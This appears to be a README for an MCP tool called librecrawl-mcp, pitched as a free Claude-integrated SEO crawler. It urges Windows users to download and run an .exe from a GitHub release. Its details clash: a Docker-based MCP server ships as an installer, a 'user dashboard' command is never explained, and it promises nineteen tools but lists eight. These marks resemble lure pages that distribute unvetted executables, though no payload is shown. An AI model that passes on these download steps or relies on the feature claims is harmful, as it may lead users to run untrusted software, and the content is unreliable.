# 🕷️ librecrawl-mcp - Run professional SEO audits from Claude

<a href="https://github.com/bridgettmirthful637/librecrawl-mcp/releases"><img src="https://img.shields.io/badge/Download-Release_Page-blue.svg" alt="Download librecrawl-mcp"></a>

librecrawl-mcp acts as a bridge between your website and the Claude AI interface. It performs deep technical SEO audits without the need for monthly subscriptions. You gain access to nineteen specialized tools that crawl your pages and report findings directly within your chat environment.

This tool functions as an alternative to enterprise scanners. It manages large websites, finds broken links, checks page headers, and maps your site structure. Because it runs locally on your computer, your data stays private and you face no limits on the number of pages you crawl.

## 🛠️ System Requirements

Ensure your computer meets these basic specifications to run the crawler smoothly:

*   Operating System: Windows 10 or Windows 11.
*   Memory: 8GB of RAM minimum (16GB recommended for large sites).
*   Storage: 500MB of free disk space for the application files.
*   Software: Docker Desktop for Windows must be installed and running.

## 📥 How to Download 

Visit https://github.com/bridgettmirthful637/librecrawl-mcp/releases to download the latest version of the software. Look for the file ending in .exe under the "Assets" section of the most recent release. Click the file to save it to your computer.

## ⚙️ Installation Steps

1. Install Docker Desktop from the official Docker website if you have not already.
2. Open Docker Desktop after the installation finishes. Wait until the status icon turns green.
3. Locate the .exe file you previously downloaded.
4. Double-click the file to begin the setup process.
5. Follow the on-screen prompts.
6. The installer will configure the connection between your computer and the Claude interface.

## 🚀 Running Your First Audit

1. Open your terminal or command prompt.
2. Type the command provided in your user dashboard to start the crawler.
3. Open Claude.
4. Select the librecrawl tools from your tool menu.
5. Enter your website URL into the chat.
6. Observe as the crawler maps your pages and compiles the data.
7. Ask Claude questions about your SEO health, such as "List all broken links" or "Identify missing meta descriptions."

## 📊 Key Features

### Technical SEO Audits
The crawler scans your site for common technical issues. It identifies crawl errors, redirect chains, and server-side problems. You receive a structured report of your site health.

### Full-Scale Web Crawling
Limits do not apply to your scans. You define the depth of the crawl. The tool follows internal links to discover every page on your domain.

### Claude Integration
The tool uses the Model Context Protocol. This allows Claude to see your website data as if it were performing the audit itself. You receive answers based on the actual status of your pages.

### Data Privacy
Your crawl data never leaves your computer. The software processes all information locally. This protects sensitive information during your analysis.

## 🧩 Understanding the Tools

The nineteen tools included in this package provide specific insights into your website:

*   Site Structure Mapper: Visualizes how pages connect.
*   Header Checker: Analyzes H1, H2, and H3 tag presence across your pages.
*   Broken Link Finder: Locates 404 errors and prevents dead ends.
*   Meta Data Auditor: Checks titles and descriptions for length and relevance.
*   Redirect Tracker: Monitors 301 and 302 redirects to ensure they function properly.
*   Canonical Link Checker: Verifies URL consistency to prevent duplicate content issues.
*   Image Alt Text Auditor: Sweeps for missing alternative text to improve accessibility.
*   Speed Diagnostic: Estimates load time impacts based on page size.

## ❓ Frequently Asked Questions

### Does this tool save my website's crawl history?
Yes. The crawler creates a local database file. You can import this file back into Claude later to compare your site performance over time.

### Can I audit password-protected pages?
The tool is designed for public websites. It cannot bypass login screens or private gateways. 

### Why do I need Docker?
Docker creates a consistent environment for the crawler. It ensures the software runs the same way on every Windows machine without requiring complex manual installation of programming languages.

### How do I stop a crawl that takes too long?
You can stop the process at any time by pressing Ctrl+C in your terminal window. The crawler saves the progress made up to that point.

## 🔧 Troubleshooting

If the crawler fails to start, verify that Docker Desktop is active. Check that your internet connection remains stable. If the connection to Claude fails, ensure you have enabled the MCP features in your Claude settings. Ensure that your firewall does not block the application from accessing local network ports. For persistent errors, restart your computer and launch Docker Desktop before the crawler application.